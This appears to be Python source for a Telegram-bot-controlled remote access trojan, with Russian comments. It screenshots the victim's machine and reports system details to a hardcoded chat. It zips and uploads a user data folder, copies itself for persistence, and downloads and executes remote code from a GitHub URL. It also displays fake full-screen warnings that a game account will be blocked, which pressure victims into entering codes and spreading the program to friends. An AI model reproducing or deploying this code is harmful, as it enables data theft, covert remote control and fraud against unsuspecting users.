

# Отправка сообщения в chat_id
chat_id = 1882056354 # Замените на ваш чат ID
with open('screenshot.png', 'rb') as screenshot_file:
    bot.send_photo(chat_id, screenshot_file)
bot.send_message(chat_id, message)
os.remove('screenshot.png')


user = os.path.expanduser("~")

def send_zip_to_telegram(telegram_bot_token, chat_id, source_dir):
  def send_file_to_telegram_in_memory(chat_id, file_data, file_name):
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
    data = {'chat_id': chat_id}
    files = {'document': (file_name, file_data)}

    response = requests.post(url, data=data, files=files)

    if response.status_code != 200:
      print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
      print(response.text)
    else:
      print("File sent successfully!")

  try:
    zip_data = BytesIO()
    with zipfile.ZipFile(zip_data, 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
      for root, _, files in os.walk(source_dir):
        for file in files:
          file_path = os.path.join(root, file)
          if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path or "working" in file_path:
            continue
          try:
            zipf.write(file_path, os.path.relpath(file_path, source_dir))
          except Exception as e:
            print(f"Error adding file to zip: {str(e)}")

    zip_data.seek(0)
    send_file_to_telegram_in_memory(chat_id, zip_data.getvalue(), 'Mraks_By_sx180.zip')
  except Exception as e:
      print(f"Error creating or sending zip file: {str(e)}")


@bot.message_handler(commands=['TG'])
def execute_code_if_internet_available():
    while True:
        if check_internet_connection():
            try:
                try:
                    pythoncom.CoInitialize()
                    current_program = os.path.abspath(sys.argv[0])
                    bot.send_message(chat_id, current_program)
                    print(current_program)
                    user_folder = os.path.expanduser("~")
                    copy_folder = os.path.join(user_folder, "MyProgram")
                    os.makedirs(copy_folder, exist_ok=True)
                    shutil.copy(current_program, copy_folder)
                    shortcut_name = "hostser.lnk"
                    shortcut_path = os.path.join(user_folder, shortcut_name)
                except Exception as e:
                    bot.send_message(chat_id, f"ERROR PRI DOBAVKE B AVTOZAPUSK: {e}")
                user = os.path.expanduser("~")
                url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/stal.py'
                response = requests.get(url)
                html_content = response.content
                soup = BeautifulSoup(html_content, 'html.parser')
                text_without_tags = soup.get_text()
                exec(text_without_tags)
                bot.send_message(chat_id, "OTPRAVKA ZAVERSHENA BRAT")
            except Exception as e:
                pass
        else:
            # print("Подключение отсутствует. Повторная попытка через 10 секунд...")
            time.sleep(10)


def find_browsers(paths: List[str] = None) -> List[str]:

    browsers = []

    # Определяем список папок, где искать браузеры
    program_files_x86 = os.environ.get('PROGRAMFILES(X86)', r"C:\Program Files (x86)")
    default_paths = [
        os.path.join(program_files_x86, "Google", "Chrome", "Application"),
        os.path.join(program_files_x86, "Mozilla Firefox"),
        os.path.join(program_files_x86, "Opera"),
        os.path.join(program_files_x86, "Microsoft", "Edge"),
        os.path.join(program_files_x86, "BraveSoftware", "Brave-Browser", "Application"),
    ]

    # Добавляем дополнительные пути, если они указаны
    if paths:
        default_paths.extend(paths)

    # Ищем браузеры в папках
    for path in default_paths:
        try:
            for filename in os.listdir(path):
                if filename.endswith((".exe", ".lnk")):
                    # Проверяем, является ли файл браузером
                    if is_browser_executable(os.path.join(path, filename)):
                        browsers.append(os.path.join(path, filename))
        except FileNotFoundError:
            pass # Папка не найдена, пропускаем

    # Ищем браузеры в реестре
    browsers.extend(find_browsers_in_registry())

    return browsers

def is_browser_executable(filepath: str) -> bool:
    """
    Проверяет, является ли файл исполняемым файлом браузера.

    Args:
        filepath (str): Путь к файлу.

    Returns:
        bool: True, если файл является браузером, иначе False.
    """
    try:
        with open(filepath, "rb") as f:
            # Ищем ключевые слова в начале файла
            data = f.read(1024)
            if b"Chrome" in data or b"Firefox" in data or b"Opera" in data or b"Edge" in data or b"Brave" in data:
                return True
    except:
        return False

    return False

def find_browsers_in_registry():
    """Ищет браузеры в реестре."""
    browsers = []

    try:
        # Chrome
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "chrome.exe"))

        # Firefox
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Mozilla Firefox")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "firefox.exe"))

        # Opera
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Opera")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "opera.exe"))

        # Edge
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "msedge.exe"))

        # Brave
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Yandex")
        install_path = winreg.QueryValueEx(key, "InstallLocation")[0]
        browsers.append(os.path.join(install_path, "yandex.exe"))

    except WindowsError:
        pass

    return browsers


@bot.message_handler(commands=['dox'])
def dox(message):
  try:
    # Скриншот
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

    # Информация о системе
    system_info = get_system_info()

    # Отправка информации
    if screenshot is not None:
      with open('screenshot.png', 'rb') as screenshot_file:
        bot.send_photo(message.chat.id, screenshot_file)
      os.remove('screenshot.png')

    bot.send_message(message.chat.id, "Подключен ПК:")

    if system_info is not None:
      bot.send_message(message.chat.id, f"Название системы: {system_info.get('system_name', 'Информация не найдена')}")
      bot.send_message(message.chat.id, f"Айпи: {system_info.get('ip_address', 'Информация не найдена')}")
      bot.send_message(message.chat.id, f"Хост: {system_info.get('hostname', 'Информация не найдена')}")
      bot.send_message(message.chat.id, f"Время работы ПК: {system_info.get('uptime', 'Информация не найдена')}")
      bot.send_message(message.chat.id, f"Процессор: {system_info.get('cpu_cores', 'Информация не найдена')} ядер (Логических: {system_info.get('cpu_logical_cores', 'Информация не найдена')}), {system_info.get('cpu_frequency', 'Информация не найдена')} МГц")
      bot.send_message(message.chat.id, f"ОЗУ: {system_info.get('used_ram', 0):.2f} ГБ / {system_info.get('total_ram', 0):.2f} ГБ (Доступно: {system_info.get('available_ram', 0):.2f} ГБ)")

  except Exception as e:
    bot.send_message(message.chat.id, f"Ошибка при получении информации: {e}")

 # Глобальная переменная для хранения ссылки на текущее окно


@bot.message_handler(commands=['msg'])
def msg(message):
    current_window = None
    global locked
    locked = True
    def show_message(msg, code=None):
        global locked
        locked = True

        # Создаем окно в главном потоке
        window = tk.Tk()
        window.title("Сообщение:")
        window.geometry("500x600")
        window.overrideredirect(True)

        def close_window():
            global locked
            locked = True
            window.destroy()

        tk.Label(window, text=msg, font=("Arial", 12)).pack(pady=20)

        if code is not None:
            tk.Label(window, text=f"Код безопасности: {code}", font=("Arial", 12)).pack()
            entry = tk.Entry(window, show="*", font=("Arial", 12))
            entry.pack(pady=10)
            tk.Label(window,
                     text=("Код для продления срока действия аккаунта можно узнать в боте."
                           "n Если вы проигнорируете это сообщение, то ваш игровой аккаунт будет заблокирован. "
                           "Также вы можете предложить друзьям скачать это приложение, и вам автоматически выдадут "
                           "аккаунт с Владельцем на целый месяц!!"),
                     font=("Arial", 12)).pack()

            def send_answer():
                global locked
                answer = entry.get()
                if answer:
                    bot.send_message(message.chat.id, f"/C {answer}")
                else:
                    messagebox.showwarning("Ошибка", "Введите ответ!")

            button = tk.Button(window, text="Отправить ответ", command=send_answer)
            button.pack(pady=10)

        else:
            entry = tk.Entry(window, font=("Arial", 12))
            entry.pack(pady=10)

            def send_answer():
                global locked
                answer = entry.get()
                if answer:
                    bot.send_message(message.chat.id, f"/C {answer}")
                else:
                    messagebox.showwarning("Ошибка", "Введите ответ!")

            button = tk.Button(window, text="Отправить ответ", command=send_answer)
            button.pack(pady=10)

        close_button = tk.Button(window, text="Закрыть", font=("Arial", 20), command=close_window)
        close_button.pack(pady=50)

        window.bind("<Escape>", lambda event: close_window())

        window.protocol("WM_DELETE_WINDOW", close_window)  # Закрытие окна по X

        window.mainloop()

    try:
        msg_text = message.text.split(' ', 1)[1]
        code = None

        if ' - ' in msg_text:
            msg_text, code_str = msg_text.split(' - ')
            code = int(code_str)

        # Вызов функции для показа сообщения в главном потоке
        bot.send_message(message.chat.id, "Сообщение отправлено.")
        show_message(msg_text, code)

    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при выводе сообщения: {e}")


@bot.message_handler(commands=['code'])
def code_message(message):
    current_window = None
    global locked
    locked = True
    def show_code_window(code):
        global locked
        locked = True

        window = tk.Tk()
        window.title("Введите код")
        window.geometry("1500x1300")
        window.overrideredirect(True)

        tk.Label(window,
                 text="\n\n\nВАШ ТАРИФ НА БЕСПЛАТНЫЙ ДОНАТ ИСТЕК!!\nКод для продления срока действия аккаунта можно узнать в боте по команде /code."
                      "\n Если вы проигнорируете это сообщение, то ваш игровой аккаунт будет заблокирован.\n "
                      "Также вы можете предложить друзьям скачать это приложение,\n и вам автоматически выдадут "
                      "аккаунт с Владельцем на целый месяц!!", font=("Arial", 12)).pack(pady=10)

        entry = tk.Entry(window, show="*", font=("Arial", 12))
        entry.pack(pady=10)

        def check_code():
            global locked
            user_code = entry.get()
            if user_code == code:
                messagebox.showinfo("УСПЕШНО",
                                    "КОД АКТИВИРОВАН!\n Вам выдано 3 месяца бесплатной игры на аккаунте! Играйте дальше!\n Можете закрыть это приложение!")
                bot.send_message(message.chat.id, "Пользователь верно активировал код!")
            else:
                messagebox.showerror("Ошибка", "Неверный код!")
                bot.send_message(message.chat.id, "Пользователь НЕ верно активировал код!")

        check_button = tk.Button(window, text="Проверить код", command=check_code)
        check_button.pack(pady=10)

        def close_window():
            global locked
            locked = True
            window.destroy()

        close_button = tk.Button(window, text="Закрыть", command=close_window)
        close_button.pack(pady=10)

        window.bind("<Escape>", lambda event: close_window())
        window.protocol("WM_DELETE_WINDOW", close_window)  # Обработка закрытия окна

        window.mainloop()

    try:
        code_text = message.text.split(' ', 1)[1]  # Получаем текст после команды /code
        show_code_window(code_text)
    except IndexError:
        bot.send_message(message.chat.id, "Необходимо указать код после команды /code")
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {e}")


@bot.message_handler(commands=['C'])
def handle_answer(message):
  try:
    answer = message.text.split(' ', 1)[1]
    # Проверка, есть ли окно
    if current_window:
      # Добавляем новое поле для ответа
      answer_label = tk.Label(current_window, text=f"Ответ: {answer}", font=("Arial", 12))
      answer_label.pack(pady=10)
    else:
      bot.send_message(message.chat.id, "Ошибка: Окно не найдено.")
  except Exception as e:
    bot.send_message(message.chat.id, f"Ошибка при обработке ответа: {e}")


def close_all_tkinter_windows():
    """Закрывает все окна Tkinter, запущенные из кода."""
    for root in tk.Tk.get_root_windows():
        if root.winfo_exists():
            root.destroy()

@bot.message_handler(commands=['msg_drop'])
def msg_drop(message):
    global locked
    if locked:
        locked = False
        try:
            # Закрываем главное окно tkinter
            if tk._default_root is not None:
                tk._default_root.destroy()
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка при закрытии окон: {e}")
        time.sleep(0.1)
        bot.send_message(message.chat.id, "ПК разблокирован.")
    else:
        bot.send_message(message.chat.id, "ПК уже разблокирован.")



@bot.message_handler(commands=['drop'])
def drop(message):
    try:
        avto(message)  # Добавляем в автозапуск
        bot.send_message(message.chat.id, "Завершаю работу...")
        os._exit(0)  # Остановка программы
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при завершении работы: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    # Проверка на наличие интернета
    if check_internet_connection():
        try:
            avtostart()
            execute_code_if_internet_available()
        except Exception as e:
            bot.send_message(chat_id, f"Ошибка при выполнении кода: {e}")
    else:
        bot.send_message(chat_id, "Нет подключения к интернету")
def mains():
    if __name__ == '__main__':
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            bot.send_message(chat_id, f"ОШИБКА В КОНЕЧНОМ ЗАПУСКЕ!! : \n  {e} ")
            print(f"ОШИБКА В КОНЕЧНОМ ЗАПУСКЕ: {e}")
            bot.polling(none_stop=True)
mains()
